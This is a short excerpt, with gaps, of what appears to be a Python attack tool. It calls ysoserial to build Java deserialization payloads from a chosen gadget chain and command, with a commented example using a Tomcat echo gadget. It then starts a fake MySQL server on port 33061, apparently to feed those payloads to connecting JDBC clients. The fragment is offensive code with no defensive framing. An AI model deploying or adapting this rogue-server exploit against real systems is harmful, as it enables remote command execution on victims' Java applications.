...
def get_yso_content(yso_type,command):
    # popen = subprocess.Popen([r'java', '-jar', 'ysoserial-0.0.8-SNAPSHOT-all.jar', 'CommonsCollectionsK1TomcatEcho', 'a'], stdout=subprocess.PIPE)
    popen = subprocess.Popen(
        [r'java', '-jar', 'ysoserial-0.0.8-SNAPSHOT-all.jar', yso_type, command],
...
if __name__ == "__main__":
    ...
    f = start_mysql_server(handle_server, host=None, port=33061)
    print("Start MySQL Fake Server at Port 33061")
